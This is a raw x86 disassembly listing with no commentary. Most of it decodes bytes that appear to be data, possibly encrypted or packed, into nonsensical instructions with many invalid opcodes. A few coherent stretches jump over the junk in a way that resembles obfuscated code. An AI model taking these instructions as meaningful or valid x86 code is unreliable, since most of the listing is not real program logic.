  40c044:	mov    BYTE PTR [ecx-0x30],ch
  40c047:	inc    esp
  40c048:	mov    eax,ds:0x364ce30d
  40c04d:	in     eax,dx
  40c04e:	call   0x95c18c01
  40c053:	mov    ah,0x8e
  40c055:	cdq    
  40c056:	and    cl,dl
  40c058:	mov    ah,0x49
  40c05a:	dec    BYTE PTR [edi]
  40c05c:	xor    al,0x6d
  40c05e:	lds    ecx,FWORD PTR [ebx-0x1f]
  40c061:	and    dh,BYTE PTR ds:0x22f8f726
  40c067:	js     0x40c0b5
  40c069:	add    ch,ch
  40c06b:	imul   BYTE PTR [ecx+0x6e]
  40c06e:	je     0x40c069
  40c070:	div    DWORD PTR [ebx+0x557ab827]
  40c076:	pop    esp
  40c077:	and    esi,ecx
  40c079:	and    bl,BYTE PTR [eax-0x38b7fdbd]
  40c07f:	or     edi,DWORD PTR [ecx]
  40c081:	jmp    0xd75ea66d
  40c086:	sbb    al,ch
  40c088:	sub    BYTE PTR [esi-0x35],ch
  40c08b:	retf   
  40c08c:	sub    al,0x7e
  40c08e:	je     0x40c0bb
  40c090:	test   eax,0xd0265bbe
  40c095:	lea    esi,[eax-0x77]
  40c098:	mov    dh,0xf0
  40c09a:	and    eax,0x825fa8a5
  40c09f:	push   ebx
  40c0a0:	sbb    eax,0xd9d932f1
  40c0a5:	inc    eax
  40c0a6:	call   0x185cd597
  40c0ab:	pop    edx
  40c0ac:	ss xchg esi,ecx
  40c0af:	push   ebx
  40c0b0:	inc    eax
  40c0b1:	ins    DWORD PTR es:[edi],dx
  40c0b2:	inc    edx
  40c0b3:	and    BYTE PTR [ecx],ah
  40c0b5:	rcl    dl,cl
  40c0b7:	cli    
  40c0b8:	push   esp
  40c0b9:	inc    edx
  40c0ba:	push   edx
  40c0bb:	add    DWORD PTR [edi+0x58],ebx
  40c0be:	aam    0x24
  40c0c0:	out    0xaf,eax
  40c0c2:	std    
  40c0c3:	jge    0x40c0d1
  40c0c5:	jmp    0xa8a57dc1
  40c0ca:	lahf   
  40c0cb:	retf   0x2fe8
  40c0ce:	xor    eax,DWORD PTR [eax-0x471b7490]
  40c0d4:	lea    esi,[ebx]
  40c0d6:	in     eax,0xf1
  40c0d8:	test   edx,esi
  40c0da:	dec    esp
  40c0db:	into   
  40c0dc:	loope  0x40c06b
  40c0de:	pop    esp
  40c0df:	adc    cl,BYTE PTR [edx+0x4c068c6b]
  40c0e5:	pop    ebp
  40c0e6:	stos   DWORD PTR es:[edi],eax
  40c0e7:	out    dx,al
  40c0e8:	mov    al,ds:0x371f50db
  40c0ed:	das    
  40c0ee:	(bad)  
  40c0ef:	xor    al,0xfa
  40c0f1:	ss mov ah,0xf4
  40c0f4:	xchg   ebx,eax
  40c0f5:	mov    edi,0x56a38736
  40c0fa:	ret    0x910b
  40c0fd:	les    esi,FWORD PTR [esp+eiz*8+0x5e89458d]
  40c104:	jmp    0x40c151
  40c106:	popa   
  40c107:	scas   eax,DWORD PTR es:[edi]
  40c108:	fcomp  DWORD PTR [edx-0x26b80f5e]
  40c10e:	jo     0x40c0d3
  40c110:	jp     0x40c180
  40c112:	mov    DWORD PTR [ebx-0x46c58735],ebp
  40c118:	mov    BYTE PTR [ecx-0x69657a3a],ch
  40c11e:	in     eax,0x4e
  40c120:	icebp  
  40c121:	mov    ecx,0x222c496b
  40c126:	mov    BYTE PTR [edx-0x32],ch
  40c129:	out    0xae,eax
  40c12b:	xor    BYTE PTR [ebx],al
  40c12d:	sub    edi,DWORD PTR [esi-0x49]
  40c130:	xor    BYTE PTR [ebx],dh
  40c132:	inc    edi
  40c133:	push   cs
  40c134:	cmp    al,0x24
  40c136:	daa    
  40c137:	and    eax,0xe6391947
  40c13c:	sub    BYTE PTR [edx],0x10
  40c13f:	ds dec ebp
  40c141:	mov    edi,0x29e0f330
  40c146:	or     eax,0xad372e79
  40c14b:	jae    0x40c133
  40c14d:	push   esp
  40c14e:	sbb    al,BYTE PTR [edi-0x1f]
  40c151:	fmul   DWORD PTR [esp+edx*2]
  40c154:	add    DWORD PTR [ecx+0x3373008f],ebp
  40c15a:	pop    esi
  40c15b:	inc    edi
  40c15c:	mov    cl,BYTE PTR [ebx]
  40c15e:	imul   esp,DWORD PTR [edx],0xcaf787c3
  40c164:	mov    ds:0x15176e,eax
  40c169:	ror    BYTE PTR [esi],cl
  40c16b:	jmp    0x61749add
  40c170:	mov    esi,0xabf06b3a
  40c175:	mov    ebp,DWORD PTR [eax]
  40c177:	sub    eax,0x39fe0f78
  40c17c:	or     esi,DWORD PTR [eax]
  40c17e:	cmp    ah,BYTE PTR [esp+ecx*8]
  40c181:	mov    ds:0x46a13765,al
  40c186:	test   al,0xc6
  40c188:	dec    eax
  40c189:	mov    edx,0x48d697dc
  40c18e:	pushf  
  40c18f:	jmp    0x7a33:0xdc0aaa61
  40c196:	das    
  40c197:	ret    0xd3a1
  40c19a:	adc    esi,DWORD PTR [esi+0x5c1b5cc4]
  40c1a0:	mov    eax,0x837937b9
  40c1a5:	push   ebx
  40c1a6:	jecxz  0x40c159
  40c1a8:	fdiv   QWORD PTR [ebx+0x6a13ebcd]
  40c1ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1af:	and    BYTE PTR ds:0x4fde679b,ch
  40c1b5:	nop    DWORD PTR [ecx+0x1a]
  40c1b9:	fnsave [eax+0x26d976d]
  40c1bf:	jb     0x40c1a1
  40c1c1:	nop
  40c1c2:	cmp    al,0x10
  40c1c4:	adc    eax,0x768e5ddf
  40c1c9:	(bad)  
  40c1ca:	rcl    DWORD PTR [ecx],cl
  40c1cc:	cmp    BYTE PTR [edx],ch
  40c1ce:	rcl    edi,0x2a
  40c1d1:	mov    al,0x98
  40c1d3:	call   0xe7d447c3
  40c1d8:	enter  0xafad,0x25
  40c1dc:	ins    DWORD PTR es:[edi],dx
  40c1dd:	inc    edx
  40c1de:	sub    eax,0x7ef63cb5
  40c1e3:	mov    ds:0x82981966,al
  40c1e8:	add    cl,cl
  40c1ea:	sbb    al,0x34
  40c1ec:	into   
  40c1ed:	and    BYTE PTR [edx*2+0x3238c1e0],0x7d
  40c1f5:	pusha  
  40c1f6:	cmp    al,0xd1
  40c1f8:	xor    eax,0x55a43ba3
  40c1fd:	arpl   WORD PTR [ebx],dx
  40c1ff:	repnz add eax,0xc9ea914
  40c205:	dec    edi
  40c206:	mov    al,ds:0x3d809d63
  40c20b:	(bad)  
  40c20c:	pushf  
  40c20d:	icebp  
  40c20e:	cmp    ecx,DWORD PTR [ebp-0x3a4fc95b]
  40c214:	push   ss
  40c215:	xor    esi,DWORD PTR [ebx-0xa]
  40c218:	les    ecx,FWORD PTR [ebx+0x60c7189c]
  40c21e:	xchg   ebx,eax
  40c21f:	in     al,dx
  40c220:	jno    0x40c22f
  40c222:	out    0x79,eax
  40c224:	inc    esi
  40c225:	mul    BYTE PTR [esi+eax*1-0x3c33f64c]
  40c22c:	xor    DWORD PTR [edi-0x18],ecx
  40c22f:	mov    esp,0x8bce1274
  40c234:	cmp    eax,0xd37453fa
  40c239:	jl     0x40c297
  40c23b:	xchg   BYTE PTR [ecx+edi*2],bl
  40c23e:	mov    BYTE PTR [ebp-0x6e0a1a51],ah
  40c244:	adc    DWORD PTR [eax+0x7d],edx
  40c247:	imul   edi,ebp,0x47a66520
  40c24d:	imul   eax,DWORD PTR [ecx-0x5],0xffffffd3
  40c251:	sahf   
  40c252:	mov    eax,ds:0x4e1063aa
  40c257:	or     ch,BYTE PTR [ecx+esi*1-0x64]
  40c25b:	pushf  
  40c25c:	arpl   ax,bp
  40c25e:	les    edx,FWORD PTR [ecx+esi*8-0x11]
  40c262:	fcmove st,st(3)
  40c264:	rcl    cl,cl
  40c266:	outs   dx,DWORD PTR ds:[esi]
  40c267:	xchg   esi,eax
  40c268:	sub    al,0x23
  40c26a:	xor    al,0xa8
  40c26c:	xor    BYTE PTR cs:[ebp+0x40],0xef
  40c271:	lods   eax,DWORD PTR ds:[esi]
  40c272:	fnstenv [esi+ebp*4-0x68]
  40c276:	inc    ebx
  40c277:	sbb    edi,DWORD PTR [ebx]
  40c279:	lahf   
  40c27a:	(bad)  
  40c27e:	icebp  
  40c27f:	shl    DWORD PTR [bx+0x0],1
  40c283:	in     al,dx
  40c284:	and    ebp,esp
  40c286:	inc    ebp
  40c287:	aas    
  40c288:	shl    cl,1
  40c28a:	add    edx,DWORD PTR [esi]
  40c28c:	jbe    0x40c280
  40c28e:	fistp  QWORD PTR [ecx]
  40c290:	retf   
  40c291:	sbb    BYTE PTR [ecx],ch
  40c293:	fidivr WORD PTR [edx+0xda4fa6]
  40c299:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c29a:	nop
  40c29b:	bound  eax,QWORD PTR [eax]
  40c29d:	mov    WORD PTR [ebx],?
  40c29f:	call   0xf0e5:0xa437e4a6
  40c2a6:	dec    ebp
  40c2a7:	imul   BYTE PTR [edi-0x401594a9]
  40c2ad:	push   eax
  40c2ae:	xchg   edi,eax
  40c2af:	test   edi,0xef16c54a
  40c2b5:	cmp    eax,0xdccef5cc
  40c2ba:	and    BYTE PTR [ebx+0x1d378869],0x64
  40c2c1:	clts   
  40c2c3:	jbe    0x40c2ff
  40c2c5:	mov    eax,DWORD PTR [ebp-0x28]
  40c2c8:	mov    di,WORD PTR [ebp-0x2c]
  40c2cc:	mov    ebx,0x8a36
  40c2d1:	jmp    0x40c5ea
  40c2d6:	xlat   BYTE PTR ds:[ebx]
  40c2d7:	cmp    al,0xc4
  40c2d9:	ds fcmovnb st,st(6)
  40c2dc:	(bad)  
  40c2de:	js     0x40c267
  40c2e0:	adc    BYTE PTR [eax-0x5d],bh
  40c2e3:	or     al,0x33
  40c2e5:	pop    ds
  40c2e6:	cmp    bl,BYTE PTR [ebx+0x7e747878]
  40c2ec:	js     0x40c366
  40c2ee:	das    
  40c2ef:	xor    eax,0xf2959f0b
  40c2f4:	sub    DWORD PTR [edi+0x2d626b00],esp
  40c2fa:	jmp    DWORD PTR [esi+0x3533c491]
  40c300:	mov    bl,ch
  40c302:	mov    bh,0x2c
  40c304:	jle    0x40c373
  40c306:	jne    0x40c2e5
  40c308:	ins    DWORD PTR es:[edi],dx
  40c309:	jns    0x40c2e9
  40c30b:	ficomp WORD PTR [ecx]
  40c30d:	sub    BYTE PTR [edi],dh
  40c30f:	ret    
  40c310:	mov    eax,0x57f6a972
  40c315:	xchg   edi,eax
  40c316:	push   ebp
  40c317:	mov    dh,0x9c
  40c319:	mov    edx,0xb858ec75
  40c31e:	cwde   
  40c31f:	inc    edx
  40c320:	adc    DWORD PTR [ecx+0x5f1feb6c],eax
  40c326:	(bad)
  40c329:	arpl   WORD PTR [eax-0xa],bp
  40c32c:	push   ecx
  40c32d:	call   0xce3e:0x35339135
  40c334:	fnstcw WORD PTR [edx*1+0x2fa8ce30]
  40c33b:	dec    esp
  40c33c:	retf   0xb26e
  40c33f:	ficom  WORD PTR [esi+0x9]
  40c342:	les    edi,FWORD PTR ds:0x2f228390
  40c348:	rol    DWORD PTR [eax],0xa4
  40c34b:	pop    edi
  40c34c:	pop    esi
  40c34d:	clc    
  40c34e:	bound  edx,QWORD PTR [edx+0x56c85d1b]
  40c354:	minps  xmm5,XMMWORD PTR [eax]
  40c357:	mov    eax,0xbc0a756c
  40c35c:	scas   al,BYTE PTR es:[edi]
  40c35d:	jp     0x40c30c
  40c35f:	inc    ebx
  40c360:	dec    edx
  40c361:	jbe    0x40c311
  40c363:	sub    DWORD PTR [ecx+0x3f],esp
  40c366:	sbb    BYTE PTR [eax+0x17bef34d],bh
  40c36c:	lahf   
  40c36d:	pop    esi
  40c36e:	add    ah,BYTE PTR [eax]
  40c370:	test   al,0xbb
  40c372:	pop    ecx
  40c373:	icebp  
  40c374:	mov    al,0xe
  40c376:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c377:	xchg   BYTE PTR [edi+0x2e],ah
  40c37a:	cmc    
  40c37b:	mov    cl,0x3a
  40c37d:	or     BYTE PTR [edi],dl
  40c37f:	adc    eax,0x66a2a5c
  40c384:	dec    ebx
  40c385:	call   0x85f0:0xa0244128
  40c38c:	or     eax,0x8b60bd5f
  40c391:	ficom  WORD PTR [ebx+0xdc9a7ac]
  40c397:	ins    DWORD PTR es:[edi],dx
  40c398:	test   al,0x7a
  40c39a:	adc    al,0xdf
  40c39c:	lods   eax,DWORD PTR ds:[esi]
  40c39d:	push   eax
  40c39e:	adc    DWORD PTR [ebx],ecx
  40c3a0:	sbb    al,0x74
  40c3a2:	mov    ebx,0x67f5322b
  40c3a7:	and    al,0x62
  40c3a9:	fist   DWORD PTR [ecx+0x739859d6]
  40c3af:	and    ecx,DWORD PTR [edi+0x40]
  40c3b2:	stos   DWORD PTR es:[edi],eax
  40c3b3:	shl    ebx,0xef
  40c3b6:	(bad)  
  40c3b8:	aad    0x58
  40c3ba:	mov    eax,0x4cc498f
  40c3bf:	scas   eax,DWORD PTR es:[edi]
  40c3c0:	retf   
  40c3c1:	aad    0xf8
  40c3c3:	out    0xc5,eax
  40c3c5:	xor    eax,0xad8f16f2
  40c3ca:	sub    al,0x8
  40c3cc:	mov    bl,0xbe
  40c3ce:	sbb    eax,0xa5bcd64f
  40c3d3:	adc    al,0x58
  40c3d5:	dec    ebx
  40c3d6:	loop   0x40c442
  40c3d8:	mov    ds:0xb03ca46d,al
  40c3dd:	add    BYTE PTR [ebp+0x55],dh
  40c3e0:	adc    al,0x5f
  40c3e2:	aaa    
  40c3e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3e4:	cli    
  40c3e5:	repnz xor DWORD PTR [edi+0x2c14102f],ecx
  40c3ec:	pop    ebx
  40c3ed:	add    esi,esi
  40c3ef:	and    BYTE PTR [edx],dh
  40c3f1:	and    edi,ebx
  40c3f3:	mov    DWORD PTR [eax+edi*8-0x32],0x9430163e
  40c3fb:	sahf   
  40c3fc:	sbb    BYTE PTR [ebx-0x2a],ch
  40c3ff:	mov    dl,0xb4
  40c401:	dec    ebx
  40c402:	pop    es
  40c403:	mov    edi,0x245870a0
  40c408:	(bad)  
  40c409:	mov    ch,0xfa
  40c40b:	mov    eax,0x7dc181ac
  40c410:	dec    ebp
  40c411:	rcr    BYTE PTR [edx-0x65adfd42],cl
  40c417:	cmp    BYTE PTR [ecx],al
  40c419:	and    eax,0xd4d59f56
  40c41e:	xor    DWORD PTR [esi],edi
  40c420:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c421:	je     0x40c42e
  40c423:	pushf  
  40c424:	push   ebp
  40c425:	call   0xfc97:0xcc4f0421
  40c42c:	inc    esp
  40c42d:	icebp  
  40c42e:	pop    ds
  40c42f:	ja     0x40c43f
  40c431:	and    eax,0xc18950d8
  40c436:	in     eax,dx
  40c437:	out    dx,eax
  40c438:	mov    ds:0x8d1045cb,eax
  40c43d:	out    0x3b,al
  40c43f:	jmp    0xbfea:0x7084be74
  40c446:	in     al,0x5
  40c448:	fimul  DWORD PTR [ebx+0x4d555e23]
  40c44e:	outs   dx,DWORD PTR ds:[esi]
  40c44f:	leave  
  40c450:	or     al,0x2d
  40c452:	pop    eax
  40c453:	mov    bh,0xfa
  40c455:	imul   edi,ebx,0x4f
  40c458:	push   esi
  40c459:	shr    esi,cl
  40c45b:	test   eax,0x9e2c77a8
  40c460:	fidiv  WORD PTR [ebp-0x318a3fb3]
  40c466:	ficom  WORD PTR [ecx]
  40c468:	sbb    eax,0x74735c25
  40c46d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c46e:	out    dx,eax
  40c46f:	inc    edi
  40c470:	mov    edx,0x8a27d833
  40c475:	mov    ebx,ebp
  40c477:	mov    DWORD PTR [ebp+0x5f],0x1b029852
  40c47e:	cdq    
  40c47f:	dec    ebx
  40c480:	sub    ah,bh
  40c482:	cld    
  40c483:	(bad)  
  40c484:	sbb    DWORD PTR [ebx+0x20],esi
  40c487:	push   eax
  40c488:	sbb    eax,0xc4b56e9b
  40c48d:	bound  ebp,QWORD PTR [edi+0x20afa55e]
  40c493:	sub    esp,eax
  40c495:	in     eax,dx
  40c496:	into   
  40c497:	add    esp,DWORD PTR [ebx+0x15]
  40c49a:	rcl    BYTE PTR [ecx+0x4d3e0e0],0xff
  40c4a1:	mov    al,0x88
  40c4a3:	mov    ebx,0xae386476
  40c4a8:	fimul  DWORD PTR ds:0x6d37f65
  40c4ae:	sub    eax,DWORD PTR [esi]
  40c4b0:	push   eax
  40c4b1:	pop    esp
  40c4b2:	jg     0x40c475
  40c4b4:	lods   al,BYTE PTR ds:[esi]
  40c4b5:	test   DWORD PTR [esi-0x75],ebp
  40c4b8:	jge    0x40c452
  40c4ba:	jg     0x40c49c
  40c4bc:	retf   
  40c4bd:	jecxz  0x40c503
  40c4bf:	and    al,0x78
  40c4c1:	call   0xc57f:0xb0c22983
  40c4c8:	imul   ecx,DWORD PTR [ebp+0x3697af1b],0x167ba363
  40c4d2:	xchg   edx,eax
  40c4d3:	mov    dl,0xb9
  40c4d5:	inc    edi
  40c4d6:	stos   DWORD PTR es:[edi],eax
  40c4d7:	add    BYTE PTR [esi+0xda77866],ch
  40c4dd:	enter  0x7cb2,0xed
  40c4e1:	mov    dl,0xff
  40c4e3:	shl    DWORD PTR [ebp-0x33],0xc4
  40c4e7:	and    al,BYTE PTR [edx-0x31e6794a]
  40c4ed:	push   ds
  40c4ee:	push   ds
  40c4ef:	xor    esi,DWORD PTR [ebp+edx*4+0x6168f602]
  40c4f6:	cmc    
  40c4f7:	push   ss
  40c4f8:	mov    cl,bl
  40c4fa:	clc    
  40c4fb:	sti    
  40c4fc:	in     al,0xee
  40c4fe:	dec    ebx
  40c4ff:	imul   ecx,DWORD PTR [edi+0x1004b80f],0xffffffb5
  40c506:	in     al,0x27
  40c508:	mov    al,0x8c
  40c50a:	add    eax,0x5a741114
  40c50f:	pop    ebx
  40c510:	int    0x9d
  40c512:	imul   eax,esp,0x75
  40c515:	sar    cl,cl
  40c517:	dec    DWORD PTR [edx+0x7e0d41b2]
  40c51d:	and    edi,DWORD PTR [edx+0x2103ca76]
  40c523:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c524:	xor    BYTE PTR [ecx+0x60d46c26],bh
  40c52a:	push   es
  40c52b:	je     0x40c56f
  40c52d:	data16 int3 
  40c52f:	gs xor eax,0xca38d766
  40c535:	mov    esp,DWORD PTR [ecx+0x248ac375]
  40c53b:	outs   dx,BYTE PTR ds:[esi]
  40c53c:	(bad)  
  40c53d:	sbb    ebp,eax
  40c53f:	ret    
  40c540:	test   al,0x92
  40c542:	cmp    esp,eax
  40c544:	dec    esp
  40c545:	ficomp WORD PTR [eax]
  40c547:	xchg   ecx,eax
  40c548:	and    al,0xde
  40c54a:	inc    esi
  40c54b:	in     eax,0x85
  40c54d:	mov    dl,0x3d
  40c54f:	sub    dh,BYTE PTR [edi+0x41]
  40c552:	jne    0x40c4e5
  40c554:	or     DWORD PTR [ebx],0xa67ecb84
  40c55a:	or     ebx,edi
  40c55c:	call   0x9c9a:0x5a0023a6
  40c563:	je     0x40c55b
  40c565:	mov    edx,0xc31cdb4e
  40c56a:	cli    
  40c56b:	sub    DWORD PTR [ebp+0x6f],0x323a227c
  40c572:	jl     0x40c52e
  40c574:	mov    dl,0xf6
  40c576:	sbb    BYTE PTR [eax+0x67],bh
  40c579:	fwait
  40c57a:	lods   al,BYTE PTR ds:[esi]
  40c57b:	lods   al,BYTE PTR ds:[esi]
  40c57c:	nop
  40c57d:	(bad)  
  40c57e:	(bad)  
  40c57f:	adc    BYTE PTR [ecx+ebp*1+0xf],bl
  40c583:	xchg   BYTE PTR [ecx],ah
  40c585:	mov    ch,0xa2
  40c587:	mov    dl,0xb4
  40c589:	das    
  40c58a:	ret    0x8cfa
  40c58d:	xor    DWORD PTR [ecx-0x4e],eax
  40c590:	mov    esp,0xc6d1f6c3
  40c595:	push   0x69
  40c597:	xor    bl,BYTE PTR [ebx+esi*1]
  40c59a:	fnstsw WORD PTR [edx+0x12]
  40c59d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c59e:	hlt    
  40c59f:	arpl   bp,cx
  40c5a1:	scas   al,BYTE PTR es:[edi]
  40c5a2:	repnz xchg ebp,eax
  40c5a4:	mov    edx,0xd317bd70
  40c5a9:	xchg   BYTE PTR [ecx+0x45ec8aa0],dl
  40c5af:	adc    DWORD PTR [edi-0x45fada87],ecx
  40c5b5:	push   ecx
  40c5b6:	mov    al,0xa8
  40c5b8:	ror    DWORD PTR [eax],1
  40c5ba:	imul   esp,ecx,0xffffffdc
  40c5bd:	push   ebx
  40c5be:	mov    esp,0x7c3475d7
  40c5c3:	cld    
  40c5c4:	pop    ecx
  40c5c5:	inc    ebp
  40c5c6:	jae    0x40c5ea
  40c5c8:	push   cs
  40c5c9:	mov    ds:0xbaac0381,al
  40c5ce:	sub    edi,esi
  40c5d0:	rcr    bh,cl
  40c5d2:	out    0x5a,eax
  40c5d4:	enter  0x6c51,0xac
  40c5d8:	loope  0x40c5da
  40c5da:	jecxz  0x40c5f1
  40c5dc:	and    BYTE PTR [eax-0x5cbd4e30],dl
  40c5e2:	fs jle 0x40c5c6
  40c5e5:	push   0x71e21afc
  40c5ea:	xor    di,bx
  40c5ed:	add    di,dx
  40c5f0:	movzx  edx,di
  40c5f3:	mov    edi,DWORD PTR [ebp-0x8]
  40c5f6:	xor    edi,ecx
  40c5f8:	lea    edx,[edx+edi*1+0x327298]
  40c5ff:	add    DWORD PTR [eax],edx
  40c601:	jmp    0x40c91a
  40c606:	cmp    eax,0xd9d2c1d7
  40c60b:	fcmove st,st(5)
  40c60d:	(bad)  ds:0x7dd2d2f7
  40c613:	push   cs
  40c614:	xchg   BYTE PTR [eax+0x36],bh
  40c617:	cwde   
  40c618:	js     0x40c692
  40c61a:	je     0x40c69a
  40c61c:	js     0x40c696
  40c61e:	in     al,0x43
  40c620:	mov    WORD PTR [ebp+0x269c31ba],es
  40c626:	mov    bl,0x57
  40c628:	pop    esp
  40c629:	in     al,0x6c
  40c62b:	push   edi
  40c62c:	or     BYTE PTR [edi],ah
  40c62e:	push   edx
  40c62f:	cs jae 0x40c648
  40c632:	sub    al,0xf8
  40c634:	mov    dl,0x7d
  40c636:	mov    edi,0x7a2defb
  40c63b:	sahf   
  40c63c:	xor    eax,0x7e9b6795
  40c641:	mov    bh,0x67
  40c643:	push   ebx
  40c644:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c645:	test   eax,0xd66fa41a
  40c64a:	cmc    
  40c64b:	lahf   
  40c64c:	dec    ebp
  40c64d:	sbb    DWORD PTR [ebx+0x1fda865e],edx
  40c653:	mov    eax,0x1462736c
  40c658:	jno    0x40c5f3
  40c65a:	cld    
  40c65b:	mov    esp,0xa58b7b54
  40c660:	dec    ebp
  40c661:	cmp    ebp,DWORD PTR [ecx]
  40c663:	xor    al,0xfd
  40c665:	mov    dh,0xb6
  40c667:	dec    ecx
  40c668:	mov    edx,0x70f5f6d0
  40c66d:	mov    edi,0x76d03e3e
  40c672:	int3   
  40c673:	adc    eax,0xaf1700df
  40c678:	and    eax,0x38e78a5
  40c67d:	adc    DWORD PTR [ebp+0x8],ecx
  40c680:	push   edi
  40c681:	bound  ebp,QWORD PTR [eax]
  40c683:	(bad)  
  40c684:	fild   QWORD PTR [ebx]
  40c686:	add    BYTE PTR [ebp-0x1e5abc74],bh
  40c68c:	dec    ebp
  40c68d:	push   ecx
  40c68e:	inc    ebp
  40c68f:	lods   eax,DWORD PTR ds:[esi]
  40c690:	fnsave [ecx-0x5584e73c]
  40c696:	jle    0x40c636
  40c698:	mov    eax,ds:0x1cb6f16a
  40c69e:	cmc    
  40c69f:	inc    edi
  40c6a0:	dec    esp
  40c6a1:	jg     0x40c69a
  40c6a3:	mul    BYTE PTR [edx-0x3a183067]
  40c6a9:	sbb    bh,BYTE PTR [edi+0x45]
  40c6ac:	push   ds
  40c6ad:	xor    DWORD PTR [ebx],ebx
  40c6af:	pop    eax
  40c6b0:	xor    al,0x37
  40c6b2:	rcl    BYTE PTR [ebx-0x37],1
  40c6b5:	je     0x40c662
  40c6b7:	ds test eax,0xf751a3a9
  40c6bd:	jo     0x40c6e4
  40c6bf:	push   ecx
  40c6c0:	loopne 0x40c72f
  40c6c2:	je     0x40c65d
  40c6c4:	jmp    0x40c6f9
  40c6c6:	clc    
  40c6c7:	gs je  0x40c675
  40c6ca:	outs   dx,BYTE PTR ds:[esi]
  40c6cb:	shl    BYTE PTR [ebp-0x69d3080a],1
  40c6d1:	loope  0x40c704
  40c6d3:	call   0xa1bb:0xc055b78a
  40c6da:	cwde   
  40c6db:	sbb    DWORD PTR [edi-0x566734f4],edi
  40c6e1:	add    DWORD PTR [esp+edx*2-0x76f8fbea],edi
  40c6e8:	push   ebp
  40c6e9:	iret   
  40c6ea:	clc    
  40c6eb:	inc    esi
  40c6ec:	jecxz  0x40c6a2
  40c6ee:	dec    ecx
  40c6ef:	loopne 0x40c679
  40c6f1:	add    eax,DWORD PTR [ebp-0xc4c2e76]
  40c6f7:	mov    WORD PTR [edi+0x43962588],fs
  40c6fd:	ss mov ah,0x34
  40c700:	inc    edi
  40c701:	mov    eax,ds:0xa3fb957a
  40c706:	sbb    ebx,DWORD PTR [edx+0x38]
  40c709:	sub    al,0x3e
  40c70b:	lock data16 jne 0x40c73a
  40c70f:	jbe    0x40c6d9
  40c711:	cs out 0x24,al
  40c714:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c715:	push   esp
  40c716:	(bad)  [ecx]
  40c718:	or     al,0x4f
  40c71a:	dec    esp
  40c71b:	(bad)  
  40c71c:	mov    ebp,0x85ad36ea
  40c721:	adc    esi,DWORD PTR [ebp+0x38]
  40c724:	sub    cl,cl
  40c726:	mov    dh,0x8f
  40c728:	pop    edi
  40c729:	mov    eax,ds:0x8486f0cb
  40c72e:	test   DWORD PTR [eax],ebx
  40c730:	xchg   esp,eax
  40c731:	cli    
  40c732:	pusha  
  40c733:	push   esp
  40c734:	adc    dh,BYTE PTR [ebp+0x4a7832e8]
  40c73a:	jmp    0x4287ebd2
  40c73f:	fild   DWORD PTR [edi]
  40c741:	pushf  
  40c742:	out    0x6d,al
  40c744:	xchg   esp,eax
  40c745:	inc    esp
  40c746:	in     eax,dx
  40c747:	mov    BYTE PTR [edi+0x40ecab9],ah
  40c74d:	xor    eax,0x8a7dea2a
  40c752:	daa    
  40c753:	fs push 0xd20df8bd
  40c759:	mov    ds:0x526793e7,al
  40c75e:	(bad)  
  40c75f:	scas   al,BYTE PTR es:[edi]
  40c760:	sbb    DWORD PTR [ebx],ebp
  40c762:	and    BYTE PTR [ecx-0x175cdd5c],dl
  40c768:	jecxz  0x40c780
  40c76a:	sub    ch,0x15
  40c76d:	pop    es
  40c76e:	ins    BYTE PTR es:[edi],dx
  40c76f:	cmp    DWORD PTR [edi+0x10],esp
  40c772:	jle    0x40c77c
  40c774:	lods   al,BYTE PTR ds:[esi]
  40c775:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c776:	sbb    BYTE PTR [ebp+0x50],cl
  40c779:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c77a:	cmp    DWORD PTR [edi],edi
  40c77c:	out    0xa5,eax
  40c77e:	pop    esi
  40c77f:	pop    ebx
  40c780:	dec    edi
  40c781:	enter  0xcda1,0x42
  40c785:	jae    0x40c7c3
  40c787:	cli    
  40c788:	sahf   
  40c789:	fimul  WORD PTR [esp-0x7b]
  40c78d:	das    
  40c78e:	es dec esp
  40c790:	dec    esi
  40c791:	xchg   edx,edi
  40c793:	retf   0xfec1
  40c796:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c797:	test   al,0xed
  40c799:	repz icebp 
  40c79b:	adc    DWORD PTR [eax],ebx
  40c79d:	in     al,0x6d
  40c79f:	scas   al,BYTE PTR es:[edi]
  40c7a0:	dec    BYTE PTR [ebx]
  40c7a2:	add    al,0xd3
  40c7a4:	(bad)  
  40c7a6:	bndldx bnd3,[eax+0xb62636c]
  40c7ad:	mov    dh,0xf8
  40c7af:	mov    al,BYTE PTR [ebp-0xe]
  40c7b2:	or     al,0xec
  40c7b4:	scas   eax,DWORD PTR es:[edi]
  40c7b5:	(bad)  
  40c7b6:	mov    ebx,0xaba53906
  40c7bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7bc:	mov    dh,0xf2
  40c7be:	adc    al,0x62
  40c7c0:	xor    BYTE PTR [ebx],0xf3
  40c7c3:	fdivr  QWORD PTR [eax]
  40c7c5:	inc    esp
  40c7c6:	mov    eax,0x6a0ad4a
  40c7cb:	das    
  40c7cc:	sar    dl,1
  40c7ce:	addr16 push esi
  40c7d0:	pop    es
  40c7d1:	icebp  
  40c7d2:	xchg   esi,eax
  40c7d3:	push   ecx
  40c7d4:	mov    edx,ebx
  40c7d6:	scas   al,BYTE PTR es:[edi]
  40c7d7:	adc    al,0xb4
  40c7d9:	jmp    0x5af8:0x6b6fe57
  40c7e0:	fistp  QWORD PTR ds:0x12fc5e9f
  40c7e6:	arpl   WORD PTR [esi],sp
  40c7e8:	sti    
  40c7e9:	clc    
  40c7ea:	mov    eax,ds:0xe5e0623a
  40c7ef:	jmp    0x40c7ca
  40c7f1:	outs   dx,BYTE PTR ds:[esi]
  40c7f2:	(bad)  
  40c7f3:	mul    DWORD PTR [edx-0x3c]
  40c7f6:	mov    WORD PTR [ecx-0x22],gs
  40c7f9:	add    al,0x84
  40c7fb:	mov    ecx,0x6d926e67
  40c800:	mov    al,BYTE PTR [ecx]
  40c802:	loope  0x40c859
  40c804:	into   
